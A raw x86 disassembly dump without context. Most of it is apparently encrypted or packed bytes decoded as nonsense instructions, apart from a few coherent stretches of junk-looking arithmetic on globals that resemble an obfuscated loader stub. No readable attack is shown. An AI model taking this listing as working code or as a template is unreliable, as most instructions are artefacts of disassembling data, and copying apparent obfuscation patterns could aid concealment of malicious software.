  40a3a6:	dec    ecx
  40a3a7:	mov    al,0xf6
  40a3a9:	dec    edx
  40a3aa:	or     BYTE PTR [esi-0x16],cl
  40a3ad:	push   ss
  40a3ae:	outs   dx,DWORD PTR ds:[esi]
  40a3af:	fist   WORD PTR ds:0xb557e3bf
  40a3b5:	arpl   WORD PTR [esi-0x69],sp
  40a3b8:	ret    0x24bb
  40a3bb:	ins    DWORD PTR es:[edi],dx
  40a3bc:	mov    al,ds:0x477eb897
  40a3c1:	div    BYTE PTR [ebp+0x144ce338]
  40a3c7:	add    bl,BYTE PTR [edx-0x1b58236b]
  40a3cd:	sahf   
  40a3ce:	ror    bl,0xf4
  40a3d1:	iret   
  40a3d2:	or     cl,ch
  40a3d4:	or     al,0x77
  40a3d6:	and    ch,BYTE PTR [eax+ebx*2+0x2499ff64]
  40a3dd:	icebp  
  40a3de:	inc    ebx
  40a3df:	fs mov bh,0xe2
  40a3e2:	mov    esi,0xd5e8287e
  40a3e7:	cdq    
  40a3e8:	stc    
  40a3e9:	fisttp DWORD PTR [esi-0x3fb72a3e]
  40a3ef:	repz inc esp
  40a3f1:	pop    esi
  40a3f2:	inc    eax
  40a3f3:	aad    0x49
  40a3f5:	inc    esi
  40a3f6:	inc    DWORD PTR [ebx-0x4cff2f31]
  40a3fc:	or     BYTE PTR es:[ecx+0x2990aeef],al
  40a403:	dec    ebp
  40a404:	repz lock pop ds
  40a407:	fld    QWORD PTR [esi]
  40a409:	test   al,0x8a
  40a40b:	jmp    0xfc962fea
  40a410:	xor    edx,eax
  40a412:	adc    DWORD PTR ds:0x4336f3,0x43371f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x43372b,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x433663
  40a440:	and    DWORD PTR ds:0x43375f,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x433757
  40a44f:	sbb    DWORD PTR ds:0x433667,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x4336f3,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x4336a7,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x4336a7
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x4336a7,ebx
  40a47f:	cmp    DWORD PTR ds:0x4336a7,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x4336a7,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x43376f,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    esp,esi
  40a4c2:	pusha  
  40a4c3:	cmp    cl,cl
  40a4c5:	mov    edi,esi
  40a4c7:	jl     0x40a545
  40a4c9:	retf   0x7c79
  40a4cc:	jl     0x40a4eb
  40a4ce:	cmp    eax,0x44d02e0e
  40a4d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4d4:	inc    esi
  40a4d5:	test   DWORD PTR [edi+0x19],0x29bccbc
  40a4dc:	dec    edx
  40a4dd:	pop    esi
  40a4de:	mul    DWORD PTR [esi+esi*2]
  40a4e1:	shl    BYTE PTR [edi+0x49],0xc
  40a4e5:	aam    0xc7
  40a4e7:	popf   
  40a4e8:	loop   0x40a49d
  40a4ea:	and    esp,DWORD PTR [esi]
  40a4ec:	jge    0x40a471
  40a4ee:	adc    dl,BYTE PTR [esi]
  40a4f0:	pop    ebx
  40a4f1:	cli    
  40a4f2:	je     0x40a55f
  40a4f4:	scas   al,BYTE PTR es:[edi]
  40a4f5:	je     0x40a4dd
  40a4f7:	push   ss
  40a4f8:	cs imul ebp,eax,0x1d
  40a4fc:	pmulhuw mm7,mm3
  40a4ff:	sub    esp,DWORD PTR [ebx-0x37e265e5]
  40a505:	push   edx
  40a506:	xchg   edi,eax
  40a507:	inc    edx
  40a508:	or     BYTE PTR [esi+0x390187e1],0xeb
  40a50f:	clc    
  40a510:	add    BYTE PTR [edi],ah
  40a512:	adc    BYTE PTR [ebp-0x44],dh
  40a515:	add    edi,0xffffffaf
  40a518:	ja     0x40a4d2
  40a51a:	sub    eax,DWORD PTR [edi]
  40a51c:	fild   WORD PTR [ebx-0x6e]
  40a51f:	sti    
  40a520:	inc    esi
  40a521:	ss std 
  40a523:	inc    edx
  40a524:	lea    ebx,[edi+0x1b]
  40a527:	push   es
  40a528:	adc    dh,BYTE PTR [edi-0x75a8fef9]
  40a52e:	and    eax,DWORD PTR ds:[ecx+0x3366663a]
  40a535:	clc    
  40a536:	and    ah,BYTE PTR [ecx+ebp*4-0x66]
  40a53a:	mov    ebp,ebp
  40a53c:	pushfw 
  40a53e:	push   ebp
  40a53f:	mov    DWORD PTR [esi+0x74a26518],ecx
  40a545:	fmul   DWORD PTR [ecx+0x10]
  40a548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a549:	into   
  40a54a:	fcomp  DWORD PTR [edi]
  40a54c:	add    cl,BYTE PTR [ebx-0x38]
  40a54f:	adc    al,0x61
  40a551:	push   es
  40a552:	jmp    0x53a10c1c
  40a557:	mov    ch,0xfc
  40a559:	add    cl,BYTE PTR [edx+0x1630e92d]
  40a55f:	adc    DWORD PTR [edx],edi
  40a561:	shl    DWORD PTR [esi-0x7d],0xde
  40a565:	and    DWORD PTR [edx+0x6c],ebp
  40a568:	and    eax,0x77b1593e
  40a56d:	sub    ah,BYTE PTR [ebx-0x6e]
  40a570:	into   
  40a571:	mov    BYTE PTR [eax-0x3f1824ef],ah
  40a577:	add    eax,0xb186a14
  40a57c:	mov    ebp,0x52c2fe49
  40a581:	inc    bx
  40a583:	cmc    
  40a584:	push   0x17
  40a586:	retf   0xa06c
  40a589:	xor    DWORD PTR [esi],ebx
  40a58b:	cli    
  40a58c:	cs mov dl,0xfd
  40a58f:	push   es
  40a590:	mov    edx,0x339cbfa9
  40a595:	(bad)  
  40a596:	jmp    0x40a584
  40a598:	jge    0x40a536
  40a59a:	std    
  40a59b:	not    BYTE PTR [eax-0x3ae63898]
  40a5a1:	fidiv  DWORD PTR [edx+0x57702e9c]
  40a5a7:	jb     0x40a5bb
  40a5a9:	add    esp,esi
  40a5ab:	inc    edx
  40a5ac:	lahf   
  40a5ad:	adc    eax,edi
  40a5af:	lds    ecx,FWORD PTR ds:0x822875d6
  40a5b5:	lahf   
  40a5b6:	outs   dx,BYTE PTR ds:[esi]
  40a5b7:	pop    esp
  40a5b8:	pushf  
  40a5b9:	call   0x78aa:0x1813f639
  40a5c0:	cmp    eax,0xbcdf3cb3
  40a5c5:	push   ebp
  40a5c6:	mov    bl,BYTE PTR [ebp-0xa]
  40a5c9:	jle    0x40a5ba
  40a5cb:	mov    ah,BYTE PTR [esi]
  40a5cd:	jb     0x40a553
  40a5cf:	test   DWORD PTR [ebp+0x58],esi
  40a5d2:	pop    esp
  40a5d3:	mul    BYTE PTR [ebp+0x0]
  40a5d6:	(bad)  
  40a5d7:	aam    0x2b
  40a5d9:	mov    ebx,0x59dbe4bd
  40a5de:	addr16 loop 0x40a5c4
  40a5e1:	xchg   esi,eax
  40a5e2:	enter  0x92a1,0x62
  40a5e6:	pop    es
  40a5e7:	xor    BYTE PTR [ecx-0x1b],bh
  40a5ea:	cli    
  40a5eb:	cmc    
  40a5ec:	jp     0x40a5b5
  40a5ee:	das    
  40a5ef:	push   ds
  40a5f0:	xor    BYTE PTR [edx+ebx*4-0x2488fcb7],0xef
  40a5f8:	dec    ecx
  40a5f9:	push   ss
  40a5fa:	stos   BYTE PTR es:[edi],al
  40a5fb:	scas   eax,DWORD PTR es:[edi]
  40a5fc:	out    dx,al
  40a5fd:	push   ss
  40a5fe:	jno    0x40a5df
  40a600:	sahf   
  40a601:	xor    al,0x39
  40a603:	add    BYTE PTR [edi-0x7e],bh
  40a606:	sbb    edx,DWORD PTR [esi]
  40a608:	out    0x10,eax
  40a60a:	shl    DWORD PTR [esi],cl
  40a60c:	sti    
  40a60d:	push   0xe6ba65c
  40a612:	fst    QWORD PTR [eax+0x3c]
  40a615:	in     eax,dx
  40a616:	jecxz  0x40a67c
  40a618:	jmp    0xda74:0x8adf7eb4
  40a61f:	pop    es
  40a620:	mov    BYTE PTR [ebx-0x46d35885],bh
  40a626:	and    al,0x8c
  40a628:	call   0xecbf883a
  40a62d:	nop
  40a62e:	inc    ecx
  40a62f:	enter  0x6e48,0x76
  40a633:	dec    esi
  40a634:	or     eax,edx
  40a636:	xchg   esi,eax
  40a637:	push   esp
  40a638:	push   cs
  40a639:	cli    
  40a63a:	xchg   ebp,eax
  40a63b:	sub    ch,BYTE PTR [edi+0x6261208e]
  40a641:	adc    DWORD PTR ds:0x38e64a81,0x1cd22cf3
  40a64b:	in     al,dx
  40a64c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a64d:	mov    dl,0xbb
  40a64f:	ins    BYTE PTR es:[edi],dx
  40a650:	fist   DWORD PTR [esi]
  40a652:	leave  
  40a653:	cmc    
  40a654:	test   al,0x79
  40a656:	sub    BYTE PTR [edx+0x60e08c44],0xe8
  40a65d:	aas    
  40a65e:	je     0x40a5fe
  40a660:	(bad)  
  40a661:	outs   dx,BYTE PTR ds:[esi]
  40a662:	push   esp
  40a663:	pusha  
  40a664:	xlat   BYTE PTR ds:[ebx]
  40a665:	dec    esp
  40a666:	into   
  40a667:	add    BYTE PTR [ebp+0x63b53a64],cl
  40a66d:	adc    BYTE PTR [eax+eax*8],dl
  40a670:	fsub   st,st(3)
  40a672:	jae    0x40a610
  40a674:	(bad)  
  40a676:	xor    esi,DWORD PTR [ebx]
  40a678:	sti    
  40a679:	iret   
  40a67a:	push   esi
  40a67b:	idiv   bh
  40a67d:	sahf   
  40a67e:	jmp    0xb0ae:0x8827208e
  40a685:	sbb    edx,0x4f
  40a688:	mov    al,ds:0xf6c1760d
  40a68d:	dec    edx
  40a68e:	jmp    0x65d5c55a
  40a693:	adc    BYTE PTR ds:0xb2c0b376,cl
  40a699:	mov    bh,0x5e
  40a69b:	mov    ds:0xbcee4c6f,al
  40a6a0:	mov    edi,0x603c90c
  40a6a5:	adc    cl,BYTE PTR [eax+0x75fa128d]
  40a6ab:	lock mov ebp,0x9bd654f1
  40a6b1:	fild   DWORD PTR [ebx]
  40a6b3:	mov    ds:0xc8b39ef0,eax
  40a6b8:	xor    eax,0x1a0376e2
  40a6bd:	pop    DWORD PTR [eax+0x73]
  40a6c0:	aas    
  40a6c1:	jge    0x40a6e5
  40a6c3:	int3   
  40a6c4:	or     al,0x9b
  40a6c6:	push   esi
  40a6c7:	cmp    eax,0x75126e41
  40a6cc:	pop    ds
  40a6cd:	loopne 0x40a743
  40a6cf:	or     edi,edx
  40a6d1:	ss cdq 
  40a6d3:	add    DWORD PTR [edx+eiz*8],0x870fc78f
  40a6da:	sub    DWORD PTR [edi+0xd],ebp
  40a6dd:	mov    esi,cs
  40a6df:	push   ds
  40a6e0:	shr    DWORD PTR [ebp-0x79c723d],0x59
  40a6e7:	aaa    
  40a6e8:	dec    eax
  40a6e9:	ds push edi
  40a6eb:	lock add al,0x77
  40a6ee:	mov    edx,DWORD PTR cs:[esi]
  40a6f1:	sub    DWORD PTR [edi+esi*1+0x47],ebx
  40a6f5:	sbb    BYTE PTR [edx-0x5],ah
  40a6f8:	jns    0x40a6f5
  40a6fa:	add    bl,ch
  40a6fc:	jo     0x40a724
  40a6fe:	or     BYTE PTR [esi-0xf],dl
  40a701:	mov    bh,0x4c
  40a703:	inc    ecx
  40a704:	(bad)  
  40a705:	ret    
  40a706:	and    al,0x81
  40a708:	jecxz  0x40a712
  40a70a:	mov    ecx,0xef7cc01a
  40a70f:	mov    edx,0xc1159dec
  40a714:	cs pusha 
  40a716:	outs   dx,DWORD PTR ds:[esi]
  40a717:	push   edx
  40a718:	mov    DWORD PTR [ecx-0x2aaba6bb],ebx
  40a71e:	mov    ch,0x6c
  40a720:	fild   DWORD PTR [ecx]
  40a722:	(bad)  
  40a725:	xchg   ecx,eax
  40a726:	std    
  40a727:	rcl    BYTE PTR [ebp+0x7338733f],cl
  40a72d:	call   0x6fd7:0xfcd12a7
  40a734:	fs call 0x38fc6516
  40a73a:	les    ecx,FWORD PTR [ebp+0x7f]
  40a73d:	and    BYTE PTR [edx+0x7],bh
  40a740:	ror    ebx,cl
  40a742:	push   ebp
  40a743:	jae    0x40a711
  40a745:	cmp    al,0x44
  40a747:	pop    edi
  40a748:	add    ebp,ebp
  40a74a:	cdq    
  40a74b:	shr    BYTE PTR [eax],1
  40a74d:	cs dec ecx
  40a74f:	xchg   BYTE PTR [edx+ebp*2-0x65e8a8d6],ch
  40a756:	fild   WORD PTR [ecx-0x4a]
  40a759:	sub    BYTE PTR [edx+0x483a88a],cl
  40a75f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a761:	js     0x40a7b3
  40a763:	pop    ecx
  40a764:	mov    bh,0xca
  40a766:	retf   0xe34d
  40a769:	ds jmp 0xfeb7:0xf81bb56f
  40a771:	rol    BYTE PTR [esi],1
  40a773:	mov    esp,0x34c027bf
  40a778:	retf   0xe744
  40a77b:	loope  0x40a742
  40a77d:	mov    eax,ds:0x3822f12a
  40a782:	sub    eax,0xccdac5e
  40a787:	scas   eax,DWORD PTR es:[edi]
  40a788:	test   BYTE PTR [edi+0xc],ch
  40a78b:	add    al,0x12
  40a78d:	push   edx
  40a78e:	gs aas 
  40a790:	mov    al,0x84
  40a792:	add    edi,eax
  40a794:	jnp    0x40a795
  40a796:	or     DWORD PTR [edx],ecx
  40a798:	ficom  DWORD PTR cs:[ecx-0x61]
  40a79c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a79d:	mov    DWORD PTR [edi+edi*2+0x713f45f8],esi
  40a7a4:	push   cs
  40a7a5:	and    eax,0x276c356
  40a7aa:	fmul   DWORD PTR [eax-0x57dadd35]
  40a7b0:	cmp    DWORD PTR [edi],eax
  40a7b2:	ja     0x40a780
  40a7b4:	inc    esi
  40a7b5:	shl    DWORD PTR [esi+0x46],0xda
  40a7b9:	sub    al,0x38
  40a7bb:	mov    dl,0x7e
  40a7bd:	(bad)  
  40a7be:	in     al,dx
  40a7bf:	mov    eax,0x2ea0fcf8
  40a7c4:	adc    DWORD PTR [ebx-0x28],edx
  40a7c7:	inc    edi
  40a7c8:	pop    ebp
  40a7c9:	sti    
  40a7ca:	inc    edi
  40a7cb:	pop    esp
  40a7cc:	adc    eax,DWORD PTR [edx]
  40a7ce:	cmp    al,BYTE PTR [eax-0x1b64f828]
  40a7d4:	loop   0x40a802
  40a7d6:	mov    edi,0x5b6cf6b3
  40a7db:	dec    edi
  40a7dc:	scas   eax,DWORD PTR es:[edi]
  40a7dd:	xor    BYTE PTR [eax+0x34],ch
  40a7e0:	pop    ebx
  40a7e1:	faddp  st(5),st
  40a7e3:	ds fcmovne st,st(5)
  40a7e6:	inc    edi
  40a7e7:	jmp    0x4b1d0d03
  40a7ec:	mov    ch,BYTE PTR [ebp-0x6d]
  40a7ef:	sbb    ecx,DWORD PTR [esi+ebx*1]
  40a7f2:	mov    cl,0x2e
  40a7f4:	js     0x40a798
  40a7f6:	add    bh,0xc
  40a7f9:	push   esp
  40a7fa:	fmul   st,st(3)
  40a7fc:	and    al,0x5d
  40a7fe:	adc    bl,BYTE PTR [ecx]
  40a800:	scas   al,BYTE PTR es:[edi]
  40a801:	mov    edx,0xac480a35
  40a806:	push   ebx
  40a807:	lock pop ds
  40a809:	mov    ch,0x48
  40a80b:	addr16 es cwde 
  40a80e:	ja     0x40a7c9
  40a810:	mov    cl,0x75
  40a812:	sbb    eax,0x475fa365
  40a817:	ja     0x40a867
  40a819:	inc    ebx
  40a81a:	int3   
  40a81b:	sub    eax,0xb5962311
  40a820:	and    bh,BYTE PTR [edi-0x2850f0f3]
  40a826:	adc    DWORD PTR ds:0x4336af,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x4336ab,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x4336ef,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433697
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x4336df,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x4336af,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x433723
  40a878:	sub    ebx,DWORD PTR ds:0x43364f
  40a87e:	mov    DWORD PTR ds:0x433723,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433697,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433717
  40a89b:	adc    DWORD PTR ds:0x433653,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x4336a7,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	jle    0x40a8fa
  40a8e3:	lods   eax,DWORD PTR cs:[esi]
  40a8e5:	addr16 lock jl 0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a946
  40a8ee:	outs   dx,DWORD PTR ds:[esi]
  40a8ef:	scas   al,BYTE PTR es:[edi]
  40a8f0:	sub    DWORD PTR [edx+0x62],ecx
  40a8f3:	mov    ds:0x5ece5b4f,eax
  40a8f8:	test   DWORD PTR [esi-0x1a],ebp
  40a8fb:	inc    eax
  40a8fc:	iret   
  40a8fd:	jmp    0xf15733b7
  40a902:	cmp    ebp,DWORD PTR [edi+0x61bedb35]
  40a908:	dec    eax
  40a909:	pop    ecx
  40a90a:	cmp    bx,WORD PTR [ecx-0x42]
  40a90e:	loope  0x40a893
  40a910:	mov    al,BYTE PTR [esi]
  40a912:	(bad)  
  40a914:	sbb    edi,esp
  40a916:	inc    esi
  40a917:	ss mov dh,0x8
  40a91a:	add    edi,DWORD PTR [ebp+0x50]
  40a91d:	rcl    al,cl
  40a91f:	jecxz  0x40a8ed
  40a921:	ja     0x40a8d3
  40a923:	push   ecx
  40a924:	add    dh,0x83
  40a927:	mov    al,0xfd
  40a929:	or     ebx,DWORD PTR [ebx-0x656fd7bb]
  40a92f:	scas   eax,DWORD PTR es:[edi]
  40a930:	fwait
  40a931:	mov    esi,0x8feb4cd9
  40a936:	ja     0x40a979
  40a938:	cmp    BYTE PTR es:[eax-0x4a],ah
  40a93c:	xchg   ebx,eax
  40a93d:	jns    0x40a996
  40a93f:	inc    ebx
  40a940:	aas    
  40a941:	sar    ah,cl
  40a943:	ds out 0xec,eax
  40a946:	lods   eax,DWORD PTR ds:[esi]
  40a947:	cmp    ebx,DWORD PTR [edx]
  40a949:	in     eax,dx
  40a94a:	lock pop ss
  40a94c:	aas    
  40a94d:	jmp    0xac61710e
  40a952:	stos   BYTE PTR es:[edi],al
  40a953:	add    al,0xda
  40a955:	repz pop ebp
  40a957:	hlt    
  40a958:	call   0x60d:0x81903444
  40a95f:	imul   esp,DWORD PTR [edx],0xff7b8e62
  40a965:	mov    ah,0x7f
  40a967:	cmp    ebp,DWORD PTR [esi-0x61]
  40a96a:	pusha  
  40a96b:	nop
  40a96c:	jbe    0x40a95b
  40a96e:	mov    al,0xc6
  40a970:	into   
  40a971:	das    
  40a972:	rcl    DWORD PTR [edi-0x9],0xa0
  40a976:	or     al,dh
  40a978:	imul   BYTE PTR [edx]
  40a97a:	enter  0x59bf,0xd7
  40a97e:	or     eax,0xf1615262
  40a983:	mov    ah,0x17
  40a985:	jno    0x40a963
  40a987:	sbb    BYTE PTR [ecx-0xd],cl
  40a98a:	xchg   ebx,eax
  40a98b:	shl    BYTE PTR [ecx],cl
  40a98d:	jl     0x40a939
  40a98f:	jnp    0x40a917
  40a991:	mov    BYTE PTR [ebp-0x2c],bh
  40a994:	jecxz  0x40a91e
  40a996:	mov    BYTE PTR [ebx],al
  40a998:	and    BYTE PTR [edx-0x26302616],ch
  40a99e:	rcl    ecx,0xfc
  40a9a1:	jb     0x40a9e1
  40a9a3:	dec    ebx
  40a9a4:	bound  ebx,QWORD PTR [edi+0x1a4fba1c]
  40a9aa:	dec    BYTE PTR ds:0xfd4b24f0
  40a9b0:	sub    WORD PTR [ebp+0x536d94af],ax
  40a9b7:	test   DWORD PTR [edx+0x19],ecx
  40a9ba:	sbb    edi,DWORD PTR [ebx*2-0x309ed304]
  40a9c1:	data16 adc ch,BYTE PTR [ecx]
  40a9c4:	or     al,0xbe
  40a9c6:	inc    ebx
  40a9c7:	cwde   
  40a9c8:	dec    esp
  40a9c9:	dec    ebx
  40a9ca:	in     eax,dx
  40a9cb:	lods   al,BYTE PTR ds:[esi]
  40a9cc:	retf   0x341f
  40a9cf:	sub    eax,0xdf484b25
  40a9d4:	sbb    esp,0x31
  40a9d7:	cwde   
  40a9d8:	js     0x40a9f2
  40a9da:	push   esi
  40a9db:	and    ah,bl
  40a9dd:	out    dx,al
  40a9de:	sub    edi,esp
  40a9e0:	loope  0x40a9e4
  40a9e2:	inc    BYTE PTR cs:[ebx+esi*4]
  40a9e6:	sahf   
  40a9e7:	outs   dx,DWORD PTR ds:[esi]
  40a9e8:	outs   dx,BYTE PTR ds:[esi]
  40a9e9:	test   eax,0x6000f9a6
  40a9ee:	cmp    edx,0xdeec4439
  40a9f4:	push   ebp
  40a9f5:	fiadd  WORD PTR [esi-0x5f]
  40a9f8:	jne    0x40a9ac
  40a9fa:	pop    esp
  40a9fb:	adc    bl,BYTE PTR ds:0x3e07b88f
  40aa01:	xor    DWORD PTR [esi],ecx
  40aa03:	lahf   
  40aa04:	mov    edi,0x13371989
  40aa09:	ret    0x4084
  40aa0c:	sub    BYTE PTR cs:[edi],ch
  40aa0f:	call   0x7202:0x634dcf8f
  40aa16:	dec    ecx
  40aa17:	(bad)  
  40aa18:	mov    esi,0x830e911
  40aa1d:	loope  0x40a9db
  40aa1f:	xlat   BYTE PTR ds:[ebx]
  40aa20:	push   eax
  40aa21:	and    eax,DWORD PTR [esi-0x41]
  40aa24:	xor    cl,BYTE PTR [ebx-0x5afd1f2e]
  40aa2a:	mov    ebp,0x1c38610
  40aa2f:	xor    DWORD PTR [edx],edx
  40aa31:	in     eax,dx
  40aa32:	scas   eax,DWORD PTR es:[edi]
  40aa33:	mov    edx,ecx
  40aa35:	pop    ebx
  40aa36:	inc    ebp
  40aa37:	ins    DWORD PTR es:[edi],dx
  40aa38:	out    dx,eax
  40aa39:	cmp    DWORD PTR [ecx-0x53],ebp
  40aa3c:	mov    ch,0x12
  40aa3e:	mov    edx,0x8177dee5
  40aa43:	dec    ebp
  40aa44:	sub    bh,BYTE PTR [ebx]
  40aa46:	add    ecx,DWORD PTR [esi]
  40aa48:	mov    ebp,0xa0a7049a
  40aa4d:	dec    esi
  40aa4e:	lock or al,0x4b
  40aa51:	pop    ds
  40aa52:	scas   al,BYTE PTR es:[edi]
  40aa53:	jb     0x40aa66
  40aa55:	mov    eax,ds:0x1c572c2b
  40aa5a:	and    al,0x4c
  40aa5c:	and    ebx,edx
  40aa5e:	retf   
  40aa5f:	data16 jno 0x40aad4
  40aa62:	inc    ebx
  40aa63:	pop    esp
  40aa64:	xchg   edx,eax
  40aa65:	ror    BYTE PTR [ecx-0x65],1
  40aa68:	pop    edx
  40aa69:	sar    cl,0xaa
  40aa6c:	add    al,0x53
  40aa6e:	mov    ecx,0x3a781c57
  40aa73:	pop    ebx
  40aa74:	and    ah,BYTE PTR [eax]
  40aa76:	sbb    BYTE PTR [ebx+0x4e571907],ah
  40aa7c:	je     0x40aa63
  40aa7e:	aas    
  40aa7f:	gs push 0x7f89ac3
  40aa85:	aad    0x73
  40aa87:	xor    dl,BYTE PTR [esp+ebp*2]
  40aa8a:	in     al,dx
  40aa8b:	jnp    0x40aa50
  40aa8d:	dec    ebx
  40aa8e:	stc    
  40aa8f:	mov    ch,0xa5
  40aa91:	lods   al,BYTE PTR ds:[esi]
  40aa92:	inc    esi
  40aa93:	stos   DWORD PTR es:[edi],eax
  40aa94:	xlat   BYTE PTR ds:[ebx]
  40aa95:	rol    DWORD PTR [eax+0x5c],0xc9
  40aa99:	xchg   ebx,eax
  40aa9a:	and    BYTE PTR [edi-0x5b2c096f],0x4b
  40aaa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaa2:	cld    
  40aaa3:	lock sahf 
  40aaa5:	stos   DWORD PTR es:[edi],eax
  40aaa6:	pushf  
  40aaa7:	sbb    BYTE PTR [edi-0x1b1ad964],0x7b
  40aaae:	sub    dh,BYTE PTR [eax+edx*8]
  40aab1:	mov    BYTE PTR [eax+eiz*2+0x2b],al
  40aab5:	enter  0x8cae,0x7f
  40aab9:	mov    edi,0xdb3e990f
  40aabe:	js     0x40aac5
  40aac0:	icebp  
  40aac1:	stos   DWORD PTR es:[edi],eax
  40aac2:	aam    0x5d
  40aac4:	sbb    DWORD PTR [edx],0x16e1729d
  40aaca:	mov    eax,DWORD PTR [ecx+0x4a]
  40aacd:	cmp    ecx,DWORD PTR [edx]
  40aacf:	dec    esi
  40aad0:	fisttp WORD PTR [edx+0x1f]
  40aad3:	push   0x799e5e0d
  40aad8:	jl     0x40aa69
  40aada:	aad    0xff
  40aadc:	cld    
  40aadd:	leave  
  40aade:	test   DWORD PTR [eax+0x3084a078],esp
  40aae4:	sbb    eax,0x89e93577
  40aae9:	xchg   ebx,eax
  40aaea:	adc    DWORD PTR [esi],esp
  40aaec:	call   0x10f5b8b2
  40aaf1:	pop    eax
  40aaf2:	fidivr WORD PTR [esi+0x2dddd5bc]
  40aaf8:	test   DWORD PTR [ebx],eax
  40aafa:	fiadd  WORD PTR [edi+eiz*8]
  40aafd:	mov    dl,BYTE PTR [edi-0xe7f42be]
  40ab03:	fidiv  WORD PTR [edi+0x3480ab86]
  40ab09:	cmp    DWORD PTR [eax+0x69],edx
  40ab0c:	mov    ds:0xa7605b80,al
  40ab11:	and    BYTE PTR [ebx+ebp*4+0x76],al
  40ab15:	sub    al,0x29
  40ab17:	mov    esi,edx
  40ab19:	push   cs
  40ab1a:	scas   al,BYTE PTR es:[edi]
  40ab1b:	add    eax,DWORD PTR [ecx-0x29]
  40ab1e:	loope  0x40ab2c
  40ab20:	add    DWORD PTR [edx+esi*2],ecx
  40ab23:	fs pop ebx
  40ab25:	fcom   DWORD PTR [ebp+0x137d1bf0]
  40ab2b:	sub    BYTE PTR [ecx-0x104ebaa4],dl
  40ab31:	dec    esi
  40ab32:	inc    ecx
  40ab33:	ficomp DWORD PTR [ecx]
  40ab35:	outs   dx,BYTE PTR ds:[esi]
  40ab36:	xchg   edx,eax
  40ab37:	or     bl,BYTE PTR [eax]
  40ab39:	dec    esp
  40ab3a:	stc    
  40ab3b:	iret   
  40ab3c:	ror    ebx,1
  40ab3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab3f:	mov    ecx,0x8dd13691
  40ab44:	sub    cl,BYTE PTR [esi+eax*2+0x58]
  40ab48:	test   eax,0x2f1d08c8
  40ab4d:	int    0x6a
  40ab4f:	add    eax,0xeb063a3
  40ab54:	cmp    BYTE PTR [ebx-0x41],ch
  40ab57:	or     DWORD PTR [eax+0x14],edx
  40ab5a:	icebp  
  40ab5b:	sbb    ebp,DWORD PTR [ecx+esi*8-0x694b4a72]
  40ab62:	fnstcw WORD PTR [eax-0x66555f4d]
  40ab68:	ds popa 
  40ab6a:	mov    eax,ds:0xa9387dc1
  40ab6f:	push   0xffffff85
  40ab71:	push   cs
  40ab72:	pop    ss
  40ab73:	ret    
  40ab74:	or     al,0x25
  40ab76:	ds dec ebp
  40ab78:	inc    esp
  40ab79:	es repz mov dh,0xf
  40ab7d:	jle    0x40ab21
  40ab7f:	sbb    DWORD PTR [edi],edi
  40ab81:	xchg   ecx,eax
  40ab82:	mov    ah,ah
  40ab84:	(bad)
  40ab88:	and    edi,DWORD PTR [eax+0xb4559f5]
  40ab8e:	adc    ebp,DWORD PTR [edi+eax*2+0x54f0a4da]
  40ab95:	test   WORD PTR [eax+0x6fd05fe2],sp
  40ab9c:	cmp    DWORD PTR cs:[edi],ebp
